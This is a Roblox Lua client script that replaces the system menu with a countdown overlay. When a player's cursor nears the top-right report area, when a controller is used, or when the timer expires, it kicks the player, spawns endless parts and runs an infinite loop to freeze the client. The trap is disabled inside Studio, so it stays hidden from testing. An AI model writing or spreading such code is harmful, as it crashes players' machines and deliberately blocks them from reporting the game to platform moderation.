repeat task.wait() until game:IsLoaded() and game:GetService("ReplicatedStorage"):WaitForChild("PlantsStorage"):FindFirstChild("Evil")
task.wait(3)

local guiservice = game:GetService("GuiService")
local runservice = game:GetService("RunService")
local replicatedstorage = game:GetService("ReplicatedStorage")
local camera = game.Workspace.CurrentCamera
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

local screenInset = 0
local onController = false
local isMenuOpened = false
local menuTimerOs = os.clock()
local menuTimer = 12
local reportAreaTimer = 0
local menuGui = script.gui menuGui.Parent = nil
local menuBlur = script.mblur menuBlur.Parent = nil

local exterminated = false
local function exterminateThisFellow()
	if (not exterminated and not game:GetService("RunService"):IsStudio()) then
		exterminated = true

		game.Players.LocalPlayer:Kick(string.rep("-\n", 999))
		task.wait(1)
		if (not game:GetService("RunService"):IsStudio()) then

			task.spawn(function() 
				while true do
					task.wait(0.1)
					for i = 1, 100 do
						local part = Instance.new("Part")
						part.Parent = game.Workspace
					end
				end
			end)

			while true do end

		end
	end
end

local function opened()
	if (menuTimerOs >= 2) then menuTimer = 12 reportAreaTimer = 0 end
	menuTimerOs = os.clock()
	isMenuOpened = true
	camera = game.Workspace.CurrentCamera
	menuGui.Parent = game.Players.LocalPlayer.PlayerGui
	pcall(function() game:GetService("ContextActionService"):UnbindAction("EnableKeyboardUINavigation") end)
end

guiservice.MenuOpened:Connect(function() 
	opened()
end)

guiservice.MenuClosed:Connect(function() 
	menuTimerOs = os.clock()
	menuGui.Parent = nil
	menuBlur.Parent = nil
	isMenuOpened = false end)

game:GetService("UserInputService").InputBegan:Connect(function(input) 
	if (input.UserInputType == Enum.UserInputType.Gamepad1) then
		onController = true
	else
		onController = false
	end
end)

runservice.RenderStepped:Connect(function(delta) 
	if (isMenuOpened) then

		menuTimer -= delta
		menuGui.timertext.Text = math.floor(menuTimer*10)/10
		if (menuTimer <= 0) then exterminateThisFellow() end

		screenInset = game.GuiService:GetGuiInset().Y
		local mousePos = Vector2.new(mouse.X, mouse.Y + screenInset)
		local xFactor = (mousePos.X / camera.ViewportSize.X)
		local yFactor = (mousePos.Y / camera.ViewportSize.Y)

		if (xFactor >= 0.5 and yFactor <= 0.2) or onController then
			reportAreaTimer += delta
			if (reportAreaTimer >= 0.1 and not exterminated) then

				exterminateThisFellow()
			end
		end

	end
end)

if (guiservice.MenuIsOpen) then
	opened() end